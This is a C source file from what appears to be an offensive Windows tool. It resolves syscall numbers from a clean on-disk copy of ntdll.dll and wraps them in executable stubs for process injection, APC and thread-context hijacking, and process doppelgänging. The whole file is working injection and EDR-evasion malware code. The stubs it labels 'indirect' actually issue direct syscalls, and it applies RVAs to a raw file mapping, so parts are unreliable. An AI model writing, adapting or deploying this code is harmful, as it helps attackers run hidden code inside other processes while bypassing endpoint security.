// syscall_resolver.c — Indirect syscall resolution for Process Injection
// Reads clean ntdll.dll from disk, extracts SSN, builds RW→RX stubs
#include "common.h"

static SYSCALL_ENTRY g_Syscalls[] = {
    // Core (shared with OS_dump)
    { L"NtOpenProcess",             0, NULL },
    { L"NtReadVirtualMemory",       0, NULL },
    { L"NtQueryVirtualMemory",      0, NULL },
    { L"NtQuerySystemInformation",  0, NULL },
    { L"NtAllocateVirtualMemory",   0, NULL },
    { L"NtWriteVirtualMemory",      0, NULL },
    { L"NtProtectVirtualMemory",    0, NULL },
    { L"NtClose",                   0, NULL },
    { L"NtFreeVirtualMemory",       0, NULL },
    { L"NtUnmapViewOfSection",      0, NULL },
    // Injection-specific
    { L"NtCreateUserProcess",       0, NULL },
    { L"NtQueueApcThread",          0, NULL },
    { L"NtResumeThread",            0, NULL },
    { L"NtGetContextThread",        0, NULL },
    { L"NtSetContextThread",        0, NULL },
    { L"NtCreateSection",           0, NULL },
    { L"NtMapViewOfSection",        0, NULL },
    // Doppelgänging (TxF)
    { L"NtCreateTransaction",       0, NULL },
    { L"NtCreateFile",              0, NULL },
    { L"NtWriteFile",               0, NULL },
    { L"NtRollbackTransaction",     0, NULL },
    { L"NtCreateProcessEx",         0, NULL },
    { L"NtCreateThreadEx",          0, NULL },
    { NULL, 0, NULL }
};

// ─── Create indirect syscall stub (12 bytes) ───
// mov r10, rcx  →  4C 8B D1
// mov eax, <N>  →  B8 XX XX XX XX
// syscall       →  0F 05
// ret           →  C3 | nop
static PVOID CreateSyscallStub(DWORD syscallNumber) {
    SIZE_T stubSize = 12;
    PVOID stub = VirtualAlloc(NULL, stubSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!stub) return NULL;

    PBYTE code = (PBYTE)stub;
    code[0] = 0x4C; code[1] = 0x8B; code[2] = 0xD1;  // mov r10, rcx
    code[3] = 0xB8;                                      // mov eax, ...
    *(PDWORD)(code + 4) = syscallNumber;
    code[8]  = 0x0F; code[9]  = 0x05;                   // syscall
    code[10] = 0xC3; code[11] = 0x90;                   // ret; nop

    DWORD oldProtect;
    VirtualProtect(stub, stubSize, PAGE_EXECUTE_READ, &oldProtect);
    return stub;
}

// ─── Walk PE export table of disk ntdll.dll → extract syscall numbers ───
BOOL InitSyscallResolver(void) {
    WCHAR ntdllPath[MAX_PATH];
    if (!GetSystemDirectoryW(ntdllPath, MAX_PATH)) return FALSE;
    wcscat_s(ntdllPath, MAX_PATH, L"\\ntdll.dll");

    HANDLE hFile = CreateFileW(ntdllPath, GENERIC_READ, FILE_SHARE_READ,
        NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;

    HANDLE hMapping = CreateFileMappingW(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
    if (!hMapping) { CloseHandle(hFile); return FALSE; }

    PBYTE base = (PBYTE)MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
    if (!base) { CloseHandle(hMapping); CloseHandle(hFile); return FALSE; }

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) goto cleanup;

    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) goto cleanup;

    DWORD exportRVA = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (exportRVA == 0) goto cleanup;

    PIMAGE_EXPORT_DIRECTORY exports = (PIMAGE_EXPORT_DIRECTORY)(base + exportRVA);
    PDWORD names    = (PDWORD)(base + exports->AddressOfNames);
    PWORD  ordinals = (PWORD)(base + exports->AddressOfNameOrdinals);
    PDWORD funcs    = (PDWORD)(base + exports->AddressOfFunctions);

    DWORD resolvedCount = 0;
    for (int i = 0; g_Syscalls[i].name != NULL; i++) {
        for (DWORD j = 0; j < exports->NumberOfNames; j++) {
            PCHAR exportName = (PCHAR)(base + names[j]);
            // Convert narrow to wide
            WCHAR wName[128]; int k = 0;
            while (exportName[k] && k < 127) { wName[k] = (WCHAR)(BYTE)exportName[k]; k++; }
            wName[k] = L'\0';

            if (wcscmp(wName, g_Syscalls[i].name) == 0) {
                PBYTE stub = base + funcs[ordinals[j]];
                DWORD ssn = *(PDWORD)(stub + 4);
                if (ssn < 0x1000) {
                    g_Syscalls[i].syscallNumber = ssn;
                    g_Syscalls[i].stubAddress = CreateSyscallStub(ssn);
                    if (g_Syscalls[i].stubAddress) resolvedCount++;
                }
                break;
            }
        }
    }

cleanup:
    UnmapViewOfFile(base); CloseHandle(hMapping); CloseHandle(hFile);
    return resolvedCount > 0;
}

// ─── Lookup helpers ───
static PVOID GetSyscallStub(PWSTR name) {
    for (int i = 0; g_Syscalls[i].name != NULL; i++) {
        if (wcscmp(g_Syscalls[i].name, name) == 0) return g_Syscalls[i].stubAddress;
    }
    return NULL;
}

// ─── Indirect syscall wrappers ───

NTSTATUS SysNtOpenProcess(HANDLE* h, ACCESS_MASK a, POBJECT_ATTRIBUTES oa, CLIENT_ID* cid) {
    PVOID s = GetSyscallStub(L"NtOpenProcess");
    if (!s) return STATUS_PROCEDURE_NOT_FOUND;
    return ((NTSTATUS(NTAPI*)(HANDLE*,ACCESS_MASK,POBJECT_ATTRIBUTES,CLIENT_ID*))s)(h,a,oa,cid);
}
NTSTATUS SysNtAllocateVirtualMemory(HANDLE h, PVOID* ba, ULONG_PTR zb, PSIZE_T sz, ULONG at, ULONG prot) {
    PVOID s = GetSyscallStub(L"NtAllocateVirtualMemory");
    if (!s) return STATUS_PROCEDURE_NOT_FOUND;
    return ((NTSTATUS(NTAPI*)(HANDLE,PVOID*,ULONG_PTR,PSIZE_T,ULONG,ULONG))s)(h,ba,zb,sz,at,prot);
}
NTSTATUS SysNtWriteVirtualMemory(HANDLE h, PVOID ba, PVOID buf, SIZE_T sz, PSIZE_T r) {
    PVOID s = GetSyscallStub(L"NtWriteVirtualMemory");
    if (!s) return STATUS_PROCEDURE_NOT_FOUND;
    return ((NTSTATUS(NTAPI*)(HANDLE,PVOID,PVOID,SIZE_T,PSIZE_T))s)(h,ba,buf,sz,r);
}
NTSTATUS SysNtProtectVirtualMemory(HANDLE h, PVOID* ba, PSIZE_T sz, ULONG np, PULONG op) {
    PVOID s = GetSyscallStub(L"NtProtectVirtualMemory");
    if (!s) return STATUS_PROCEDURE_NOT_FOUND;
    return ((NTSTATUS(NTAPI*)(HANDLE,PVOID*,PSIZE_T,ULONG,PULONG))s)(h,ba,sz,np,op);
}
NTSTATUS SysNtReadVirtualMemory(HANDLE h, PVOID ba, PVOID buf, SIZE_T sz, PSIZE_T r) {
    PVOID s = GetSyscallStub(L"NtReadVirtualMemory");
    if (!s) return STATUS_PROCEDURE_NOT_FOUND;
    return ((NTSTATUS(NTAPI*)(HANDLE,PVOID,PVOID,SIZE_T,PSIZE_T))s)(h,ba,buf,sz,r);
}
NTSTATUS SysNtQueryVirtualMemory(HANDLE h, PVOID ba, ULONG ic, PVOID mbi, SIZE_T sz, PSIZE_T r) {
    PVOID s = GetSyscallStub(L"NtQueryVirtualMemory");
    if (!s) return STATUS_PROCEDURE_NOT_FOUND;
    return ((NTSTATUS(NTAPI*)(HANDLE,PVOID,ULONG,PVOID,SIZE_T,PSIZE_T))s)(h,ba,ic,mbi,sz,r);
}
NTSTATUS SysNtQuerySystemInformation(ULONG ic, PVOID buf, ULONG sz, PULONG r) {
    PVOID s = GetSyscallStub(L"NtQuerySystemInformation");
    if (!s) return STATUS_PROCEDURE_NOT_FOUND;
    return ((NTSTATUS(NTAPI*)(ULONG,PVOID,ULONG,PULONG))s)(ic,buf,sz,r);
}
NTSTATUS SysNtClose(HANDLE h) {
    PVOID s = GetSyscallStub(L"NtClose");
    if (!s) return STATUS_PROCEDURE_NOT_FOUND;
    return ((NTSTATUS(NTAPI*)(HANDLE))s)(h);
}
NTSTATUS SysNtFreeVirtualMemory(HANDLE h, PVOID* ba, PSIZE_T sz, ULONG ft) {
    PVOID s = GetSyscallStub(L"NtFreeVirtualMemory");
    if (!s) return STATUS_PROCEDURE_NOT_FOUND;
    return ((NTSTATUS(NTAPI*)(HANDLE,PVOID*,PSIZE_T,ULONG))s)(h,ba,sz,ft);
}
NTSTATUS SysNtUnmapViewOfSection(HANDLE h, PVOID ba) {
    PVOID s = GetSyscallStub(L"NtUnmapViewOfSection");
    if (!s) return STATUS_PROCEDURE_NOT_FOUND;
    return ((NTSTATUS(NTAPI*)(HANDLE,PVOID))s)(h,ba);
}
NTSTATUS SysNtQueueApcThread(HANDLE hThread, PVOID ApcRoutine, PVOID arg1, PVOID arg2, PVOID arg3) {
    PVOID s = GetSyscallStub(L"NtQueueApcThread");
    if (!s) return STATUS_PROCEDURE_NOT_FOUND;
    return ((NTSTATUS(NTAPI*)(HANDLE,PVOID,PVOID,PVOID,PVOID))s)(hThread,ApcRoutine,arg1,arg2,arg3);
}
NTSTATUS SysNtResumeThread(HANDLE hThread, PULONG prevCount) {
    PVOID s = GetSyscallStub(L"NtResumeThread");
    if (!s) return STATUS_PROCEDURE_NOT_FOUND;
    return ((NTSTATUS(NTAPI*)(HANDLE,PULONG))s)(hThread,prevCount);
}
NTSTATUS SysNtGetContextThread(HANDLE hThread, PCONTEXT ctx) {
    PVOID s = GetSyscallStub(L"NtGetContextThread");
    if (!s) return STATUS_PROCEDURE_NOT_FOUND;
    return ((NTSTATUS(NTAPI*)(HANDLE,PCONTEXT))s)(hThread,ctx);
}
NTSTATUS SysNtSetContextThread(HANDLE hThread, PCONTEXT ctx) {
    PVOID s = GetSyscallStub(L"NtSetContextThread");
    if (!s) return STATUS_PROCEDURE_NOT_FOUND;
    return ((NTSTATUS(NTAPI*)(HANDLE,PCONTEXT))s)(hThread,ctx);
}
NTSTATUS SysNtCreateSection(PHANDLE hSec, ACCESS_MASK a, POBJECT_ATTRIBUTES oa, PLARGE_INTEGER sz,
    ULONG prot, ULONG allocAttrib, HANDLE hFile) {
    PVOID s = GetSyscallStub(L"NtCreateSection");
    if (!s) return STATUS_PROCEDURE_NOT_FOUND;
    return ((NTSTATUS(NTAPI*)(PHANDLE,ACCESS_MASK,POBJECT_ATTRIBUTES,PLARGE_INTEGER,ULONG,ULONG,HANDLE))s)
        (hSec,a,oa,sz,prot,allocAttrib,hFile);
}
NTSTATUS SysNtMapViewOfSection(HANDLE hSec, HANDLE hProc, PVOID* ba, ULONG_PTR zb, SIZE_T cs,
    PLARGE_INTEGER so, PSIZE_T vs, DWORD inherit, ULONG at, ULONG prot) {
    PVOID s = GetSyscallStub(L"NtMapViewOfSection");
    if (!s) return STATUS_PROCEDURE_NOT_FOUND;
    return ((NTSTATUS(NTAPI*)(HANDLE,HANDLE,PVOID*,ULONG_PTR,SIZE_T,PLARGE_INTEGER,PSIZE_T,DWORD,ULONG,ULONG))s)
        (hSec,hProc,ba,zb,cs,so,vs,inherit,at,prot);
}
NTSTATUS SysNtCreateUserProcess(PHANDLE phProc, PHANDLE phThread, ACCESS_MASK pa, ACCESS_MASK ta,
    POBJECT_ATTRIBUTES poa, POBJECT_ATTRIBUTES toa, ULONG flags, ULONG threadFlags,
    PVOID params, PVOID createInfo, PVOID attrList) {
    PVOID s = GetSyscallStub(L"NtCreateUserProcess");
    if (!s) return STATUS_PROCEDURE_NOT_FOUND;
    return ((NTSTATUS(NTAPI*)(PHANDLE,PHANDLE,ACCESS_MASK,ACCESS_MASK,POBJECT_ATTRIBUTES,
        POBJECT_ATTRIBUTES,ULONG,ULONG,PVOID,PVOID,PVOID))s)
        (phProc,phThread,pa,ta,poa,toa,flags,threadFlags,params,createInfo,attrList);
}
// ─── Doppelgänging wrappers ───
NTSTATUS SysNtCreateTransaction(PHANDLE hTx, ACCESS_MASK a, POBJECT_ATTRIBUTES oa, LPGUID guid,
    HANDLE hRm, DWORD createOpt, DWORD timeout, DWORD descLen, PVOID desc) {
    PVOID s = GetSyscallStub(L"NtCreateTransaction");
    if (!s) return STATUS_PROCEDURE_NOT_FOUND;
    return ((NTSTATUS(NTAPI*)(PHANDLE,ACCESS_MASK,POBJECT_ATTRIBUTES,LPGUID,HANDLE,DWORD,DWORD,DWORD,PVOID))s)
        (hTx,a,oa,guid,hRm,createOpt,timeout,descLen,desc);
}
NTSTATUS SysNtCreateFile(PHANDLE hFile, ACCESS_MASK a, POBJECT_ATTRIBUTES oa, PIO_STATUS_BLOCK iosb,
    PLARGE_INTEGER allocSz, ULONG fa, ULONG share, ULONG disp, ULONG createOpt, PVOID eaBuf, ULONG eaLen,
    HANDLE hTx) {
    PVOID s = GetSyscallStub(L"NtCreateFile");
    if (!s) return STATUS_PROCEDURE_NOT_FOUND;
    return ((NTSTATUS(NTAPI*)(PHANDLE,ACCESS_MASK,POBJECT_ATTRIBUTES,PIO_STATUS_BLOCK,PLARGE_INTEGER,
        ULONG,ULONG,ULONG,ULONG,PVOID,ULONG,HANDLE))s)
        (hFile,a,oa,iosb,allocSz,fa,share,disp,createOpt,eaBuf,eaLen,hTx);
}
NTSTATUS SysNtWriteFile(HANDLE hFile, HANDLE hEvent, PVOID apcRoutine, PVOID apcCtx,
    PIO_STATUS_BLOCK iosb, PVOID buf, ULONG len, PLARGE_INTEGER off, PULONG key) {
    PVOID s = GetSyscallStub(L"NtWriteFile");
    if (!s) return STATUS_PROCEDURE_NOT_FOUND;
    return ((NTSTATUS(NTAPI*)(HANDLE,HANDLE,PVOID,PVOID,PIO_STATUS_BLOCK,PVOID,ULONG,PLARGE_INTEGER,PULONG))s)
        (hFile,hEvent,apcRoutine,apcCtx,iosb,buf,len,off,key);
}
NTSTATUS SysNtRollbackTransaction(HANDLE hTx, BOOL wait) {
    PVOID s = GetSyscallStub(L"NtRollbackTransaction");
    if (!s) return STATUS_PROCEDURE_NOT_FOUND;
    return ((NTSTATUS(NTAPI*)(HANDLE,BOOL))s)(hTx,wait);
}
NTSTATUS SysNtCreateProcessEx(PHANDLE hProc, ACCESS_MASK a, POBJECT_ATTRIBUTES oa,
    HANDLE parentProc, ULONG flags, HANDLE hSec, HANDLE hDbg, HANDLE hExcept, DWORD procId) {
    PVOID s = GetSyscallStub(L"NtCreateProcessEx");
    if (!s) return STATUS_PROCEDURE_NOT_FOUND;
    return ((NTSTATUS(NTAPI*)(PHANDLE,ACCESS_MASK,POBJECT_ATTRIBUTES,HANDLE,ULONG,HANDLE,HANDLE,HANDLE,DWORD))s)
        (hProc,a,oa,parentProc,flags,hSec,hDbg,hExcept,procId);
}
NTSTATUS SysNtCreateThreadEx(PHANDLE hThread, ACCESS_MASK a, POBJECT_ATTRIBUTES oa,
    HANDLE hProc, PVOID entry, PVOID param, ULONG flags, ULONG_PTR zb, SIZE_T ss,
    SIZE_T cs, PVOID attrList) {
    PVOID s = GetSyscallStub(L"NtCreateThreadEx");
    if (!s) return STATUS_PROCEDURE_NOT_FOUND;
    return ((NTSTATUS(NTAPI*)(PHANDLE,ACCESS_MASK,POBJECT_ATTRIBUTES,HANDLE,PVOID,PVOID,ULONG,ULONG_PTR,SIZE_T,SIZE_T,PVOID))s)
        (hThread,a,oa,hProc,entry,param,flags,zb,ss,cs,attrList);
}
